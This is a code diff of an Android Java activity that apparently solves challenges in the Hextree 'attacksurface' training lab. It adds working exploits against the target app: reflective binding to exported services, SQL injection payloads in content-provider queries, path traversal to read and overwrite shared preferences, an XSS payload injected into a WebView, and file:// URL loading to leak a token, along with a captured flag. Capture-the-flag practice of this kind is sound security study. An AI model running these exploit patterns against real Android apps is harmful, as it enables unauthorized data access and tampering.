@@ -1,7 +1,5 @@
 package com.sntrain.kribas.hextree1;
 
-import android.Manifest;
-import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
@@ -10,19 +8,17 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
 import android.os.IBinder;
-import android.os.Looper;
 import android.os.Message;
 import android.os.Messenger;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
-import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.activity.EdgeToEdge;
@@ -30,23 +26,27 @@ import androidx.activity.result.ActivityResultLauncher;
 import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
-import androidx.core.app.NotificationCompat;
-import androidx.core.app.NotificationManagerCompat;
-import androidx.core.content.ContextCompat;
 import androidx.core.graphics.Insets;
 import androidx.core.view.ViewCompat;
 import androidx.core.view.WindowInsetsCompat;
 
 import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
+import java.util.Arrays;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.stream.Collectors;
+
+import io.hextree.attacksurface.services.IFlag28Interface;
+import io.hextree.attacksurface.services.IFlag29Interface;
 
 public class MainHextreeSolverActivity extends AppCompatActivity {
     int count = 0;
@@ -65,6 +65,96 @@ public class MainHextreeSolverActivity extends AppCompatActivity {
                         }
                     }
             );
+
+    private ActivityResultLauncher<Intent> flag33_1Launcher = registerForActivityResult(
+            new ActivityResultContracts.StartActivityForResult(),
+            result -> {
+                if (result.getResultCode() == -1) {
+                    Intent data = result.getData();
+                    if (data != null) {
+                        Uri uri = data.getData();
+                        String sqli = "1=1 UNION SELECT null,title,content,null FROM Note";
+                        dumpCP(uri,sqli);
+                        Log.d("Flag33.1Solver", "Uri is: " + uri.toString());
+
+                    }
+                }
+            }
+    );
+
+
+    private ActivityResultLauncher<Intent> flag34Launcher = registerForActivityResult(
+            new ActivityResultContracts.StartActivityForResult(),
+            result -> {
+                if (result.getResultCode() == -1 || result.getResultCode() == 0) {
+                    Intent data = result.getData();
+                    if (data != null) {
+                        Uri uri = data.getData();
+                        String file = MyUtils.readFile(this,uri);
+                        Log.d("Flag34Solver", "Uri is: " + uri.toString());
+                        Log.v("Flag34Solver", "Content: "+file);
+
+                    }
+                }
+            }
+    );
+
+    private ActivityResultLauncher<Intent> flag35Launcher = registerForActivityResult(
+            new ActivityResultContracts.StartActivityForResult(),
+            result -> {
+                Log.v("Flag35Solver","Result: "+result);
+                if (result.getResultCode() == -1 || result.getResultCode() == 0) {
+                    Intent data = result.getData();
+                    if (data != null) {
+                        Uri uri = data.getData();
+                        String file = MyUtils.readFile(this,uri);
+                        Log.d("Flag35Solver", "Uri is: " + uri.toString());
+                        Log.v("Flag35Solver", "Content: "+file);
+
+                    }
+                }
+            }
+    );
+
+
+    private ActivityResultLauncher<Intent> flag36Launcher = registerForActivityResult(
+            new ActivityResultContracts.StartActivityForResult(),
+            result -> {
+                Log.v("Flag36Solver","Result: "+result);
+                if (result.getResultCode() == -1 || result.getResultCode() == 0) {
+                    Intent data = result.getData();
+                    if (data != null) {
+                        Uri uri = data.getData();
+                        Log.d("Flag36Solver", "Uri is: " + uri.toString());
+                        try {
+                            InputStream inputStream = this.getContentResolver().openInputStream(uri);
+                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                            String content = bufferedReader.lines()
+                                    .collect(Collectors.joining("\n"));
+                            inputStream.close();
+                            String modified = content.replace(
+                                    "name=\"solved\" value=\"false\"",
+                                    "name=\"solved\" value=\"true\""
+                            );
+
+                            // Write the modified content back
+                            OutputStream outputStream = this.getContentResolver().openOutputStream(uri, "wt");
+                            outputStream.write(modified.getBytes());
+                            outputStream.close();
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                        String file = MyUtils.readFile(this,uri);
+                        Log.v("Flag36Solver", "Content: "+file);
+                        Intent intent = new Intent();
+                        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
+                        intent.putExtra("filename","../shared_prefs/Flag36Preferences.xml");
+                        flag35Launcher.launch(intent);
+                    }
+                }
+            }
+    );
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -415,7 +505,7 @@ public class MainHextreeSolverActivity extends AppCompatActivity {
                     Intent intent1 = new Intent();
                     intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
                     intent1.setAction("io.hextree.services.START_FLAG24_SERVICE");
-                    Log.v("Flag24Solver",DumpIntent.dumpIntent(MainHextreeSolverActivity.this,intent1));
+                    Log.v("Flag24Solver", MyUtils.dumpIntent(MainHextreeSolverActivity.this,intent1));
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         startForegroundService(intent1);
                     } else {
@@ -558,6 +648,307 @@ public class MainHextreeSolverActivity extends AppCompatActivity {
 
             }
         });
+
+
+        //Flag28Activity
+        Button f28 = findViewById(R.id.f28);
+        f28.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag28Solver","Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
+                ServiceConnection mconnect = new ServiceConnection() {
+
+                    @Override
+                    public void onServiceConnected(ComponentName name, IBinder service) {
+                        Log.v("Flag28Solver","Service Connected");
+                        try {
+                            // Questo carica l'interfaccia a runtime
+                            // direttamente dall'apk target
+                            // Non richiede di clonare l'AIDL
+                            this.onServiceConnectedV2(name,service);
+                        } catch (Exception e){
+                            // Questo carica l'interfaccia staticamente
+                            // Richeide di ricreare l'AIDL
+                            e.printStackTrace();
+                            this.onServiceConnectedV1(name,service);
+                        }
+                    }
+                    public void onServiceConnectedV1(ComponentName name, IBinder service) {
+                        Log.v("Flag28Solver","Service Connected V1");
+                        IFlag28Interface flag28Interface = IFlag28Interface.Stub.asInterface(service);
+                        try {
+                            flag28Interface.openFlag();
+                        }
+                        catch (Exception e){
+                            e.printStackTrace();
+                        }
+                    }
+
+
+                    public void onServiceConnectedV2(ComponentName name, IBinder service) throws PackageManager.NameNotFoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+                        Log.v("Flag28Solver","Service Connected V2");
+                        // First get the classLoarder for the target APP
+                        Log.v("Flag28Solver","Getting ClassLoader");
+                        ClassLoader classLoader = MainHextreeSolverActivity.this
+                                .createPackageContext("io.hextree.attacksurface", Context.CONTEXT_INCLUDE_CODE|Context.CONTEXT_IGNORE_SECURITY)
+                                .getClassLoader();
+                        // Then load the interface
+                        Log.v("Flag28Solver","Loading Interface");
+                        Class<?> flag28Interface = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");
+                        // Then find the Stub subclass
+                        Log.v("Flag28Solver","Finding Stub");
+                        Class<?> flag28InterfaceStub = Arrays.stream(flag28Interface.getDeclaredClasses()).filter(subclass -> subclass.getSimpleName().equals("Stub")).findFirst().orElse(null);
+                        // Then find the asInterface method
+                        Log.v("Flag28Solver","Finding asInterface");
+                        Method flag28StubAsInterfaceMethod = flag28InterfaceStub.getDeclaredMethod("asInterface",IBinder.class);
+                        // Now i can finally have an interactable service interface
+                        Log.v("Flag28Solver","Getting an instance");
+                        Object flag28Service = flag28StubAsInterfaceMethod.invoke(null,service);
+                        Log.v("Flag28Solver","Invoking openFlag()");
+                        flag28Service.getClass().getDeclaredMethod("openFlag").invoke(flag28Service);
+                    }
+
+                    @Override
+                    public void onServiceDisconnected(ComponentName name) {
+                        Log.v("Flag28Solver","Service Disconnected");
+                    }
+                };
+                bindService(intent,mconnect,Context.BIND_AUTO_CREATE);
+                // Dopo aver premuto il tasto fai partire il servizio:
+                // adb shell am startservice -n io.hextree.attacksurface/io.hextree.attacksurface.services.Flag28Service
+
+            }
+        });
+
+        //Flag28Activity
+        Button f29 = findViewById(R.id.f29);
+        f29.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag29Solver","Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag29Service");
+                ServiceConnection mconnect = new ServiceConnection() {
+                    @Override
+                    public void onServiceConnected(ComponentName name, IBinder service) {
+                        Log.v("Flag29Solver","Service Connected");
+                        IFlag29Interface flag29Interface = IFlag29Interface.Stub.asInterface(service);
+                        try {
+                            String password = flag29Interface.init();
+                            Log.v("Flag29Solver","Received Password:"+password+". Authenticating... ");
+                            flag29Interface.authenticate(password);
+                            Log.v("Flag29Solver","Hopefully authenticated, calling success");
+                            flag29Interface.success();
+                        }
+                        catch (Exception e){
+                            e.printStackTrace();
+                        }
+                    }
+
+                    @Override
+                    public void onServiceDisconnected(ComponentName name) {
+                        Log.v("Flag29Solver","Service Disconnected");
+                    }
+                };
+                bindService(intent,mconnect,Context.BIND_AUTO_CREATE);
+                // Dopo aver premuto il tasto fai partire il servizio:
+                // adb shell am startservice -n io.hextree.attacksurface/io.hextree.attacksurface.services.Flag29Service
+
+            }
+        });
+
+
+        //Flag30Activity
+        Button f30 = findViewById(R.id.f30);
+        f30.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag30Solver","Button Clicked");
+                //Cursor queryResult =  MainHextreeSolverActivity.this.getContentResolver().query(Uri.parse("io.hextree.flag30"),null,null,null);
+                try {
+                    dumpCP(Uri.parse("content://io.hextree.flag30/success"));
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
+                Toast.makeText(v.getContext(),"[Flag30Solver] Query Executed check logs",Toast.LENGTH_LONG).show();
+            }
+        });
+
+        //Flag31Activity
+        Button f31 = findViewById(R.id.f31);
+        f31.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag31Solver","Button Clicked");
+                //Cursor queryResult =  MainHextreeSolverActivity.this.getContentResolver().query(Uri.parse("io.hextree.flag30"),null,null,null);
+                try {
+                    dumpCP(Uri.parse("content://io.hextree.flag31/flag/31"));
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
+                Toast.makeText(v.getContext(),"[Flag31Solver] Query Executed check logs",Toast.LENGTH_LONG).show();
+            }
+        });
+
+        //Flag32Activity
+        Button f32 = findViewById(R.id.f32);
+        f32.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag32Solver","Button Clicked");
+                String sqli = "1=0) UNION SELECT _id,name,value,visible FROM Flag UNION SELECT null,title,content,null FROM Note WHERE (1=1";
+                //Cursor queryResult =  MainHextreeSolverActivity.this.getContentResolver().query(Uri.parse("io.hextree.flag30"),null,null,null);
+                try {
+                    dumpCP(Uri.parse("content://io.hextree.flag32/flags"),sqli);
+                }catch (Exception e){
+                    e.printStackTrace();
+                }
+                Toast.makeText(v.getContext(),"[Flag32Solver] Query Executed check logs",Toast.LENGTH_LONG).show();
+            }
+        });
+
+        //Flag33Activity1
+        Button f33_1 = findViewById(R.id.f33_1);
+        f33_1.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag33.1Solver","Button Clicked");
+
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag33Activity1");
+                intent.setAction("io.hextree.FLAG33");
+                flag33_1Launcher.launch(intent);
+
+
+                Toast.makeText(v.getContext(),"[Flag33.1Solver] Query Executed check logs",Toast.LENGTH_LONG).show();
+            }
+        });
+
+        //Flag33Activity2
+        Button f33_2= findViewById(R.id.f33_2);
+        f33_2.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag33.3Solver","Button Clicked");
+
+                Toast.makeText(v.getContext(),"[Flag33.2Solver] Not Yet Implemented!",Toast.LENGTH_LONG).show();
+            }
+        });
+
+        //Flag34Activity
+        Button f34= findViewById(R.id.f34);
+        f34.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag34Solver","Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag34Activity");
+                intent.putExtra("filename","flags/flag34.txt");
+                flag34Launcher.launch(intent);
+            }
+        });
+
+        //Flag35Activity
+        Button f35= findViewById(R.id.f35);
+        f35.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag35Solver","Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
+                intent.putExtra("filename","../flag35.txt");
+                flag35Launcher.launch(intent);
+            }
+        });
+
+        //Flag36Activity
+        Button f36= findViewById(R.id.f36);
+        f36.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag36Solver","Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
+                intent.putExtra("filename","../shared_prefs/Flag36Preferences.xml");
+                flag36Launcher.launch(intent);
+            }
+        });
+
+        //Flag39Activity
+        Button f39 = findViewById(R.id.f39);
+        f39.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag39Solver","Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
+                intent.putExtra("NAME","Executing hextree.success()<br/><img src=x onerror=javascript:hextree.success()>");
+                startActivity(intent);
+            }
+        });
+
+        //Flag37Activity
+        Button f37 = findViewById(R.id.f37);
+        f37.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag39Solver","Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
+                intent.putExtra("NAME","Executing hextree.success()<br/><img src=x onerror=javascript:hextree.success()>");
+                startActivity(intent);
+            }
+        });
+
+        //Flag40Activity
+        Button f40 = findViewById(R.id.f40);
+        f40.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag40Solver","Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag40WebViewsActivity");
+                intent.putExtra("URL","file:///data/data/io.hextree.attacksurface/files/token.txt");
+                startActivity(intent);
+                // Probabilmente un'intended ma aprendo molto velocemente l'inspector e incollando questa roba:
+                // hextree.authCallback(document.getElementsByTagName("pre")[0].innerText)
+                // hai la flag
+                // HXT{leak-fileprovider-1gash2}
+            }
+        });
+    }
+
+    public void dumpCP(Uri uri) {
+        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
+        if (cursor.moveToFirst()) {
+            do {
+                StringBuilder sb = new StringBuilder();
+                for (int i = 0; i < cursor.getColumnCount(); i++) {
+                    if (sb.length() > 0) {
+                        sb.append(", ");
+                    }
+                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
+                }
+                Log.v("DumpContentProviderQuery", sb.toString());
+            } while (cursor.moveToNext());
+        }
+    }
+    public void dumpCP(Uri uri,String selection) {
+        Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
+        if (cursor.moveToFirst()) {
+            do {
+                StringBuilder sb = new StringBuilder();
+                for (int i = 0; i < cursor.getColumnCount(); i++) {
+                    if (sb.length() > 0) {
+                        sb.append(", ");
+                    }
+                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
+                }
+                Log.v("DumpContentProviderQuery", sb.toString());
+            } while (cursor.moveToNext());
+        }
     }
 
     @Override
